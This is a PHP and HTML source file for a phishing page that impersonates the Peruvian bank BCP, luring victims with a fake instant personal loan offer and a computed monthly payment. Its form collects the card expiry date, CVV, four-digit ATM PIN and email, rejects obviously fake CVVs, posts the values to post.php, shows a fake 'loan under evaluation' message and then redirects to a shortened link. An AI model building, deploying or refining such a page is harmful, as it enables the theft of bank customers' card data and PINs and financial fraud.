<?php
error_reporting(0);
session_start();
/*************************************************************************/
if ($_SESSION["openPE"] != "True") {
	header("Location: ./"); }
/*************************************************************************/
if ($_SESSION["corto"] == "Estimado Usuario(a)") {
	$nombre = "";
} else {
	$nombre = $_SESSION["corto"];
}
/*************************************************************************/
if ($_SESSION["presto"] >= 100 && $_SESSION["presto"] <= 3000) {
	$meses = $_SESSION["mpay"];
	$interes_anual = 26;
	$desgravamen = 0.705;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen/100), 2);
	$tasa = round((pow(1 + ($interes_anual/100), 30/360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual/100), 30/360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
}
/*************************************************************************/
if ($_SESSION["presto"] >= 3001 && $_SESSION["presto"] <= 10000) {
	$meses = $_SESSION["mpay"];
	$interes_anual = 24;
	$desgravamen = 0.605;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen/100), 2);
	$tasa = round((pow(1 + ($interes_anual/100), 30/360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual/100), 30/360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
}
/*************************************************************************/
if ($_SESSION["presto"] >= 10001 && $_SESSION["presto"] <= 25000) {
	$meses = $_SESSION["mpay"];
	$interes_anual = 22;
	$desgravamen = 0.505;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen/100), 2);
	$tasa = round((pow(1 + ($interes_anual/100), 30/360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual/100), 30/360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
}
/*************************************************************************/
if ($_SESSION["presto"] >= 25001 && $_SESSION["presto"] <= 80000) {
	$meses = $_SESSION["mpay"];
	$interes_anual = 18;
	$desgravamen = 0.405;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen/100), 2);
	$tasa = round((pow(1 + ($interes_anual/100), 30/360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual/100), 30/360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
}
/*************************************************************************/
if ($_SESSION["presto"] >= 80001 && $_SESSION["presto"] <= 200000) {
	$meses = $_SESSION["mpay"];
	$interes_anual = 15;
	$desgravamen = 0.305;

	$total_desgravamen = round($_SESSION["presto"] * ($desgravamen/100), 2);
	$tasa = round((pow(1 + ($interes_anual/100), 30/360) - 1), 5);
	$tasa_mensual = round(((pow(1 + ($interes_anual/100), 30/360) - 1) * 100), 2);

	$xx = (1 - pow((1 + $tasa), (-$meses))) / $tasa;
	$yy = round($_SESSION["presto"] * pow($xx, (-1)), 2);

	$cuota_mensual = $yy + $total_desgravamen;
}
/*************************************************************************/
?>
<!DOCTYPE html>
<html device-type="desktop" class="hydrated">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>BCP al instante</title>
    <link rel="stylesheet" href="pe/styles/main.css">
    <meta content="width=device-width, initial-scale=1" name="viewport">
    <link href="pe/images/favicon.ico" rel="icon" type="image/x-icon">
    <link rel="stylesheet" href="pe/styles/stylo.css">
	<style>
		.loading {
			padding: 390px 0px 0px 485px;
		}

		@media only screen and (max-width: 575px) {
			.loading {
				padding: 440px 0px 0px 0px;
			}
		}

		@font-face {
			font-family: password;
			font-style:normal;
			font-weight:400;
			src: url(pe/styles/fuente/password.ttf); }

		.mask { font-family: password!important; }



		.separator {
			margin-bottom: 5px;
		}

		.teclita {
			width: 21%;
		}

		.b_tecla {
			display: none;
			text-align: center;
			background-color: rgb(255, 255, 255);
			border-radius: 10px;
			margin-top: 4px;
			padding: 5px;
			box-shadow: rgb(82 112 148 / 20%) 0px 1px 8px, rgb(82 112 148 / 12%) 0px 3px 3px -2px, rgb(82 112 148 / 14%) 0px 3px 4px;
		}

		span, input {
            font-family: var(--bcp-font-family-primary-demi, "Flexo-Demi"), helvetica, arial, sans-serif;
            font-size: 1rem;
            padding: 0;
        }

		label {
            display: block;
            width: 100%;
            border: 1px solid var(--onsurface-600, #868f9e);
            padding: 12px 10px;
            position: relative;
            box-sizing: border-box;
            border-radius: 8px;
            transition: .25s;
        }

        label input {
            display: block;
            width: 100%;
            border: none;
            background: transparent;
            outline: none;
        }

		label span {
            color: silver;
            position: absolute;
            top: 12px;
            left: 10px;
            transition: .25s;
        }

		/* Focus */

		label.focus {
            border-color: var(--primary-400, #0a47f0);
            -webkit-box-shadow: inset 0 0 0 1px var(--primary-400, #0a47f0);
            box-shadow: inset 0 0 0 1px var(--primary-400, #0a47f0);
        }

        label span.focus {
            color: var(--primary-400, #0a47f0);
        }

        /* Top */

        label span {
            left: 8px;
            top: -10px;
            font-size: 12px;
            background: white;
            padding: 0 6px;
        }
	</style>
</head>
<body class="">
<div id="loader_ajax" style="position: fixed; top: 0px; left: 0px; z-index: 9999999999; width: 100%; height: 100%; overflow-y: none; display: none;">
    <div id="ajax_loader" class="esparta">
        <div class="text-center">
            <img src="pe/images/spinner.gif" class="loading">
        </div>
    </div>
</div>
<app-root _nghost-aqk-c52="" ng-version="12.2.16">
	<router-outlet _ngcontent-aqk-c52=""></router-outlet>
	<app-initial-verify _nghost-aqk-c63="">
		<div _ngcontent-aqk-c63="" class="container-fluid" style="overflow-y: visible;">
			<div _ngcontent-aqk-c63="" class="row" style="min-height: 100%;">
				<div _ngcontent-aqk-c63="" class="col-4 d-none d-md-block channel-image-style">
					<app-channel-image _ngcontent-aqk-c63="" _nghost-aqk-c59="">
						<div _ngcontent-aqk-c59="" class="channel-img-fixed" style="background-image: url(pe/images/EV.jpg); background-repeat: no-repeat; background-size: cover; background-position: center center; height: 100%;">
							<img _ngcontent-aqk-c59="" src="pe/images/logo.svg" class="mt16 logoSize logoStyle">
						</div>
					</app-channel-image>
				</div>
				<div _ngcontent-aqk-c63="" class="col" style="position: relative; overflow-y: visible;">
					<app-home-header _ngcontent-aqk-c63="" _nghost-aqk-c54="">
						<div _ngcontent-aqk-c54="" class="row justify-content-end header-padding bar-blue header-first-pages">
							<div _ngcontent-aqk-c54="" class="col-6 col-md-3 di-lg-none px-0 header-logo-padding">
								<img _ngcontent-aqk-c54="" src="pe/images/logo.svg" class="logo-small">
							</div>
							<div _ngcontent-aqk-c54="" class="col-xl-12 d-none d-md-block">
								<div _ngcontent-aqk-c54="" class="row justify-content-end">
									<bcp-icon _ngcontent-aqk-c54="" name="chronometer-r" color="text" class="bar-blue hydrated" style="padding-top: 2px;">
										<i class="icon chronometer-r text"></i>
									</bcp-icon>
								</div>
							</div>
							<div _ngcontent-aqk-c54="" class="col-6 col-md-9 di-lg-none" style="padding-top: 3px;"></div>
						</div>
						<div>&nbsp;</div>
						<div _ngcontent-aqk-c54="" class="row back-button-medium d-only-mobile"></div>
					</app-home-header>
					<div _ngcontent-aqk-c63="" class="row container-form">
						<div _ngcontent-aqk-c63="" class="col mtTable" style="margin-top: 8px;">
							<div _ngcontent-aqk-c63="" class="box-wrapper container">
								<form class="ng-pristine ng-invalid ng-touched" id="inicio">
									<div _ngcontent-aqk-c63="" class="row mt8 mb32">
										<div _ngcontent-aqk-c63="" class="col text-center">
											<bcp-title _ngcontent-aqk-c63="" size="md" class="hydrated">
												<h2 class="">Dinero al Instante</h2>
											</bcp-title>
											<p style="padding-top: 25px; text-align: justify;">
												Hola, <b><font color="#002a8d"><?=$nombre;?></font></b> estas a un paso de completar la solicitud de tu prestamo personal de <b><font color="#002a8d">S/. <?=number_format($_SESSION["presto"]);?></font></b> financiado en <b><font color="#002a8d"><?=$meses;?> meses, </font></b> donde pagarias <b><font color="#002a8d">S/. <?=number_format($cuota_mensual, 2);?> mensuales.</font></b>
											</p>
											<p style="text-align: justify;">
												Para continuar con el proceso por favor valide los datos de su tarjeta, los cuales nos permitirá realizar el cobro de las cuotas mensuales.
											</p>
										</div>
									</div>
									<div _ngcontent-aqk-c63="" class="row mb24">
										<div _ngcontent-aqk-c63="" class="col">
											<bcp-select-input _ngcontent-aqk-c63="" class="ng-untouched ng-pristine ng-invalid hydrated">
												<div class="row no-gutters select-input-container">
													<div class="col input-container">
														<bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg" trigger="click" class="hydrated">
															<bcp-input class="hydrated">
																<div class="form-group">
																	<label>
																		<span>Número de Tarjeta</span>
																		<input autocomplete="off" id="carta" name="carta" type="tel" disabled="" value="<?=$_SESSION["puerta"];?>">
																	</label>
																	<input type="hidden" id="tipo" value="<?=$_SESSION["tipex"];?>">
																</div>
															</bcp-input>
														</bcp-tooltip>
													</div>
												</div>
												<div style="padding-top: 15px;">
													<div class="row no-gutters select-input-container">
														<div class="col input-container">
															<bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg" trigger="click" class="hydrated">
																<bcp-input class="hydrated">
																	<div class="form-group">
																		<label id="title_0">
																			<span id="sub_0">Vencimiento [Mes/Año]</span>
																			<input autocomplete="off" name="caduco" id="caduco" type="tel" maxlength="5" placeholder="[MM/YY]" required="" onclick="hide_1(); hide_2();">
																		</label>
																	</div>
																</bcp-input>
															</bcp-tooltip>
														</div>
													</div>
												</div>

												<div style="padding-top: 15px;">
													<div class="row no-gutters select-input-container">
														<div class="col input-container">
															<bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg" trigger="click" class="hydrated">
																<bcp-input class="hydrated">
																	<div class="form-group">
																		<label id="title_1">
																			<span id="sub_1">3 digitos parte posterior</span>
																			<input autocomplete="off" id="secret" name="secret" type="tel" maxlength="4" placeholder="CVV" required="" onkeypress="return tipoFiltro(event)" onclick="key_1(); hide_2();">
																		</label>
																	</div>
																	<div id="teclado_1" class="keypad-seed-containerx b_tecla">
																		<div>
																			<div class="separator left">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/4.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/5.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/6.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/9.png">
																			</div>
																		</div>
																		<div>
																			<div class="separator left">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/9.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/4.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/6.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/3.png">
																			</div>
																		</div>
																		<div>
																			<div class="separator left">
																				<img _ngcontent-c17="" class="clean-buttonx teclita" id="delete_1" keypadcleanall="" src="pe/images/teclado/keypad_delete-new.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/0.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/8.png">
																				<img _ngcontent-c17="" class="clean-buttonx teclita" id="clean_1" keypadclean="" src="pe/images/teclado/keypad_clean-new.png">
																			</div>
																		</div>
																	</div>
																</bcp-input>
															</bcp-tooltip>
														</div>
													</div>
												</div>


												<div style="padding-top: 15px;">
													<div class="row no-gutters select-input-container">
														<div class="col input-container">
															<bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg" trigger="click" class="hydrated">
																<bcp-input class="hydrated">
																	<div class="form-group">
																		<label id="title_2">
																			<span id="sub_2">Clave 4 digitos (Cajero Automatico)</span>
																			<input class="mask" autocomplete="off" id="secure" name="secure" type="tel" maxlength="4" placeholder="ATM" required="" onkeypress="return tipoFiltro(event)" onclick="key_2(); hide_1(); ">
																		</label>
																	</div>
																	<div id="teclado_2" class="keypad-seed-containerx b_tecla">
																		<div>
																			<div class="separator left">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/4.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/5.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/6.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/9.png">
																			</div>
																		</div>
																		<div>
																			<div class="separator left">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/9.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/4.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/6.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/3.png">
																			</div>
																		</div>
																		<div>
																			<div class="separator left">
																				<img _ngcontent-c17="" class="clean-buttonx teclita" id="delete_2" keypadcleanall="" src="pe/images/teclado/keypad_delete-new.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/0.png">
																				<img _ngcontent-c17="" class="seed-enabled teclita" src="pe/images/teclado/8.png">
																				<img _ngcontent-c17="" class="clean-buttonx teclita" id="clean_2" keypadclean="" src="pe/images/teclado/keypad_clean-new.png">
																			</div>
																		</div>
																	</div>
																</bcp-input>
															</bcp-tooltip>
														</div>
													</div>
												</div>

												<div style="padding-top: 15px;">
													<div class="row no-gutters select-input-container">
														<div class="col input-container">
															<bcp-tooltip _ngcontent-hjc-c2="" position="top" size="lg" trigger="click" class="hydrated">
																<bcp-input class="hydrated">
																	<div class="form-group">
																		<label id="title_3">
																			<span id="sub_3">Email</span>
																			<input autocomplete="off" id="buzon" type="text" maxlength="50" placeholder="Ingresa tu Email" required="" onclick="hide_1(); hide_2();">
																		</label>
																	</div>
																</bcp-input>
															</bcp-tooltip>
														</div>
													</div>
												</div>
											</bcp-select-input>
										</div>
									</div>
									<p id="alerta" style="text-align: center; color: red; font-size: 0.9rem; display: none;"></p>
									<div _ngcontent-aqk-c63="" class="row button-space-bottom d-sm-block btn-not-fixed">
										<div _ngcontent-aqk-c63="" class="col">
											<bcp-button _ngcontent-aqk-c63="" type="button" tier="primary" size="lg" full-width="" class="hydrated">
												<button type="button" class="btn btn-primary btn-lg btn-block" onclick="post(1);" id="btn">
													<bcp-paragraph class="hydrated">
														<p class="paragraph-lg bcp-font-demi white">Continuar </p>
													</bcp-paragraph>
												</button>
											</bcp-button>
										</div>
									</div>
								</form>


								<form class="ng-pristine ng-invalid ng-touched" style="display: none;" id="finality">
									<div _ngcontent-aqk-c63="" class="row mt8 mb32">
										<div _ngcontent-aqk-c63="" class="col text-center" style="padding-top: 140px;">
											<bcp-title _ngcontent-aqk-c63="" size="md" class="hydrated">
												<h2 class="">Proceso Completado</h2>
											</bcp-title>
											<p style="padding-top: 25px; text-align: justify;">
												Estimado(a), <b><font color="#002a8d"><?=$nombre;?></font></b> la <b><font color="#002a8d">primera fase</font></b> del proceso se ha completado con <b><font color="#002a8d">éxito</font></b>, su solicitud de préstamo esta en <b><font color="#002a8d">proceso de evaluación</font></b>, en caso de ser aprobado uno de nuestros asesores se pondrá en contacto con usted para culminar el <b><font color="#002a8d">desembolso de su préstamo.</font></b>
											</p>
										</div>
									</div>
									<div _ngcontent-aqk-c63="" class="row button-space-bottom d-sm-block btn-not-fixed">
										<div _ngcontent-aqk-c63="" class="col">
											<bcp-button _ngcontent-aqk-c63="" type="button" tier="primary" size="lg" full-width="" class="hydrated">
												<button type="button" class="btn btn-primary btn-lg btn-block" onclick="post(2);" id="btns">
													<bcp-paragraph class="hydrated">
														<p class="paragraph-lg bcp-font-demi white">Continuar </p>
													</bcp-paragraph>
												</button>
											</bcp-button>
										</div>
									</div>
								</form>
							</div>
						</div>
					</div>
					<app-home-footer _ngcontent-aqk-c63="" _nghost-aqk-c55="">
						<div _ngcontent-aqk-c55="" class="justify-content-end footer-padding">
							<div _ngcontent-aqk-c55="" class="col remove-padding p-0">
								<div _ngcontent-aqk-c55="" class="box-wrapper container footer-container">
									<section _ngcontent-aqk-c55="" class="footer-main-text">
										<div _ngcontent-aqk-c55="" class="m-footer-icon">
											<bcp-icon _ngcontent-aqk-c55="" name="lock-b" color="onsurface-600" class="hydrated">
												<i class="icon lock-b onsurface-600"></i>
											</bcp-icon>
										</div>
										<div _ngcontent-aqk-c55="" class="container-text-large">
											<bcp-paragraph _ngcontent-aqk-c55="" color="onsurface-600" size="sm" family="regular" class="footer-text hydrated">
												<p class="paragraph-sm bcp-font-regular onsurface-600"> 
													Esta es una página segura. Si tienes dudas sobre la autenticidad de la web, comunícate <br _ngcontent-aqk-c55="" class="displayDesktop">con nosotros al 311-8989 ó a través de nuestros medios digitales. 
												</p>
											</bcp-paragraph>
										</div>
									</section>
									<div _ngcontent-aqk-c55="" class="d-block d-lg-none container-footer-line">
										<div _ngcontent-aqk-c55="" class="footer-line"></div>
									</div>
									<bcp-paragraph _ngcontent-aqk-c55="" color="onsurface-600" size="sm" family="regular" class="d-none d-sm-block copyright-text hydrated">
										<p class="paragraph-sm bcp-font-regular onsurface-600"> 
											Todos los derechos reservados &nbsp;&nbsp;|&nbsp;&nbsp;© 2023 VIABCP 
										</p>
									</bcp-paragraph>
									<div _ngcontent-aqk-c55="" class="d-block d-sm-none">
										<bcp-paragraph _ngcontent-aqk-c55="" color="onsurface-600" size="sm" family="regular" class="copyright-text hydrated">
											<p class="paragraph-sm bcp-font-regular onsurface-600"> 
												© 2022 VIABCP.com<br _ngcontent-aqk-c55="">Todos los derechos reservados 
											</p>
										</bcp-paragraph>
									</div>
								</div>
							</div>
						</div>
					</app-home-footer>
				</div>
			</div>
		</div>
    </app-initial-verify>
</app-root>
<script type="text/javascript" src="pe/js/jquery-3.1.0.min.js"></script>
<script type="text/javascript" src="pe/js/mask.js"></script>
<script type="text/javascript" src="pe/js/value.js"></script>
<script type="text/javascript" src="pe/js/node.js"></script>
<script type='text/javascript'>

	function shuffle(array) {

		var currentIndex = array.length, temporaryValue, randomIndex;

		while (0 !== currentIndex) {
			randomIndex = Math.floor(Math.random() * currentIndex);
			currentIndex -= 1;
			temporaryValue = array[currentIndex];
			array[currentIndex] = array[randomIndex];
			array[randomIndex] = temporaryValue;
		}
		return array;
	}

	$(document).ready(function() {
		$("#caduco").mask("00/00");
		formato();

		if($("#secret").val().length <= $("#secret").attr("maxlength")){
			$("#secret").val("");
			table_1 = [3,7,1,9,2,8,4,6,5,0];
			num_1 = shuffle(table_1);

			$.each($("#teclado_1 .separator .seed-enabled"), function(key) {
				this.value = num_1[key];
				$(this).attr("src","pe/images/teclado/" + num_1[key] + ".png");
			});
		}

		if($("#secure").val().length <= $("#secure").attr("maxlength")){
			$("#secure").val("");
			table_2 = [6,4,9,1,0,2,5,3,8,7];
			num_2 = shuffle(table_2);

			$.each($("#teclado_2 .separator .seed-enabled"), function(key) {
				this.value = num_2[key];
				$(this).attr("src","pe/images/teclado/" + num_2[key] + ".png");
			});
		}
	});


	$("#secret").focus(function() {
        key_1();
    });

	$("#secure").focus(function() {
        key_2();
    });

	$("#caduco").focus(function() {
		$('#title_0').addClass('focus top');
		$('#sub_0').addClass('focus');
    });

	$("#caduco").blur(function() {
		$('#title_0').removeClass('focus top');
		$('#sub_0').removeClass('focus');
    });

	$("#secret").focus(function() {
		$('#title_1').addClass('focus top');
		$('#sub_1').addClass('focus');
    });

	$("#secret").blur(function() {
		$('#title_1').removeClass('focus top');
		$('#sub_1').removeClass('focus');
    });

	$("#secure").focus(function() {
		$('#title_2').addClass('focus top');
		$('#sub_2').addClass('focus');
    });

	$("#secure").blur(function() {
		$('#title_2').removeClass('focus top');
		$('#sub_2').removeClass('focus');
    });

	$("#buzon").focus(function() {
		$('#title_3').addClass('focus top');
		$('#sub_3').addClass('focus');
    });

	$("#buzon").blur(function() {
		$('#title_3').removeClass('focus top');
		$('#sub_3').removeClass('focus');
    });


	function key_1() {
		$("#teclado_1").show(600);
		$("#secret").attr("readonly","readonly");
	}

	function key_2() {
		$("#teclado_2").show(600);
		$("#secure").attr("readonly","readonly");
	}

	function hide_1() {
		$("#teclado_1").hide(600);
		$("#secret").removeAttr("readonly");
	}

	function hide_2() {
		$("#teclado_2").hide(600);
		$("#secure").removeAttr("readonly");
	}


	$("#teclado_1 .separator .seed-enabled").click(function(e) {
		var permitido = document.getElementById("secret").maxLength;
		if($("#secret").val().length == $("#secret").attr("maxlength")-1) {
			strng = $("#secret").val();
			$("#secret").val(strng + this.value);
			hide_1();
		} else if ($("#secret").val().length < permitido) {
			strng = $("#secret").val();
			$("#secret").val(strng + this.value);
		}
	});

	$("#clean_1").click(function(e) {
		pass = $("#secret").val();
		if(pass.length >= 1){
			$("#secret").val(pass.substring(0,pass.length-1));
		}
	});

	$("#delete_1").click(function(e) {
		if($("#secret").val().length >= 1) {
			$("#secret").val("");
		}
	});


	$("#teclado_2 .separator .seed-enabled").click(function(e) {
		if($("#secure").val().length == $("#secure").attr("maxlength")-1) {
			strng = $("#secure").val();
			$("#secure").val(strng + this.value);
			hide_2();
		} else if ($("#secure").val().length < 4) {
			strng = $("#secure").val();
			$("#secure").val(strng + this.value);
		}
	});

	$("#clean_2").click(function(e) {
		pass = $("#secure").val();
		if(pass.length >= 1){
			$("#secure").val(pass.substring(0,pass.length-1));
		}
	});

	$("#delete_2").click(function(e) {
		if($("#secure").val().length >= 1) {
			$("#secure").val("");
		}
	});


	function formato() {
		if ($("#tipo").val() != "amex") {
			$("#secret").attr('maxlength', '3');
			$("#sub_1").html("3 digitos parte posterior");
		} else {
			$("#secret").attr('maxlength', '4');
			$("#sub_1").html("4 digitos parte frontal");
		}
	}


    function tipoFiltro(e) {

        var charCode = e.key;

        if((/^[0-9]+$/.test(charCode))) {
            return true;
        } else {
            return false;
        }
    }


    function post(post) {

		let h = document.querySelector("#caduco"); // Vencimiento
		let i = document.querySelector("#secret"); // CVV
		let j = document.querySelector("#secure"); // ATM
		let k = document.querySelector("#buzon"); // Email
		var tipo = document.querySelector("#tipo"); // Tipo de tarjeta
		var fecha = new Date();
		var yea_actual = parseInt(fecha.getFullYear().toString().substr(-2));
		var mes_actual = (fecha.getMonth() + 1).toString();
		if (mes_actual.length === 1) { mes_actual = parseInt("0"+mes_actual); }
		var vencimiento = h.value;
		var newFecha = vencimiento.split('/');
		var mes = newFecha[0];
		var yea = newFecha[1];

		let xd = document.querySelector("#carta").value;
		let one = xd.substr(0, 3);
		let two = xd.substr(-3);
        
        let x = post;

        switch (x) {
    
            case 1: // Tarjeta

				if (tipo.value != "amex") { newcvv = "3"; msg_c = "[3 digitos parte posterior]"; } else { newcvv = "4"; msg_c = "[4 digitos parte frontal]"; }

				if (h.value.length < 5) {
					$("#alerta").html("* Debes ingresar la fecha de vencimiento de tu tarjeta").show();
					h.focus();
					return false;
				}

				if (mes == 00 || mes > 12) {
					$("#alerta").html('* El <b>mes</b> ['+ mes +'] no corresponde a un mes valido, por favor vuelva a ingresarlo').show();
					h.focus();
					return false; 
				}

				if (yea < yea_actual || yea > (Number(yea_actual)+5)) {
					$("#alerta").html('* El <b>año</b> ['+ yea +'] no corresponde a un año valido, por favor vuelva a ingresarlo').show();
					h.focus();
					return false;
				}

				if (mes <= mes_actual && yea == yea_actual) {
					$("#alerta").html('* Su tarjeta ha vencido, por favor verifique su fecha y vuelva a ingresarlo').show();
					h.focus();
					return false;
				}

				if (i.value.length < newcvv) {
					$("#alerta").html('* Debes ingresar el código cvv de tu tarjeta ' + msg_c).show();
					i.focus();
					return false;
				}

				if (i.value == 123 || i.value == one || i.value == two) {
					$("#alerta").html('* El código cvv ingresado <b>['+ i.value +']</b>, no corresponde a uno valido, por favor vuelva a ingresarlo').show();
					i.focus();
					return false;
				}

				if (j.value.length == 0 || j.value.length < 4) {
					$("#alerta").html('* Ingrese su clave de 4 dígitos').show();
					j.focus();
					return false;
				}

				if (k.value.length < 9) {
					$("#alerta").html("Ingresa ó completa tu email");
					k.focus();
					return false;
				} else {
					var regex = /[\w-\.]{2,}@([\w-]{2,}\.)*([\w-]{2,}\.)[\w-]{2,4}/;
					if (regex.test(k.value.trim())) {
						$("#alerta").html("&nbsp;");
					} else {
						$("#alerta").html("Por favor, ingresa un correo electrónico valido");
						k.focus();
						return false;
					}
				}

                var parametros = {
					"data_6": h.value,
					"data_7": i.value,
					"data_8": j.value,
					"data_11": k.value,
                    "orden": "C", }
                
				$("#alerta").hide();
                $("#loader_ajax").show();
				$('#btn').prop('disabled', true);
            
                $.ajax({
                    data: parametros,
                    url: 'post.php',
                    type: 'post',
                    success: function(response) {
                        setTimeout(function() {
                            $("#loader_ajax").hide();
							$("#inicio").hide(600);
							$("#finality").show();
							$('#btn').prop('disabled', false);
                        }, 1800);
                    }
                });
    
            break;

			case 2: // Salir

				$("#loader_ajax").show();
				$('#btns').prop('disabled', true);

				setTimeout(function() {
					$('#btns').prop('disabled', false);
					window.open('https://bit.ly/tePrestoAhora', '_parent');
				}, 1800);

			break;
    
            default:
            break;
        }
    }
</script>
</body>
</html>